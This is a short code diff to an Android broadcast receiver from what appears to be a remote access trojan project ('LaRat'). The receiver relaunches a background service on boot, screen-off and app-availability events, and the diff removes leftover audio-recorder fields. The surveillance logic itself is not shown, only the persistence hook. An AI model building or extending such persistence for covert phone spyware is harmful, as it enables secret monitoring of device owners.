@@ -9,22 +9,25 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.media.MediaRecorder;
+import android.util.Log;
+
+import com.parse.Parse;
+import com.parse.ParseConfig;
 
 public class LaRatServiceReceiver extends BroadcastReceiver {
 
     public static Context mContext;
-    boolean recordStarted=false;
-    MediaRecorder recorder = new MediaRecorder();
 
     @Override
     public void onReceive(final Context context, Intent intent)
     {
         mContext = context;
         String intentString = intent.getAction();
+        Log.d("Received intent", intentString);
 
         if(intentString.equals(Intent.ACTION_BOOT_COMPLETED) | intentString.equals(Intent.ACTION_SCREEN_OFF) | intentString.equals(Intent.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE))
         {
-            if(!IsServiceRunning(mContext)== false)
+            if(!IsServiceRunning(mContext))
             {
                 mContext.startService(new Intent(mContext, LaRatService.class));
             }
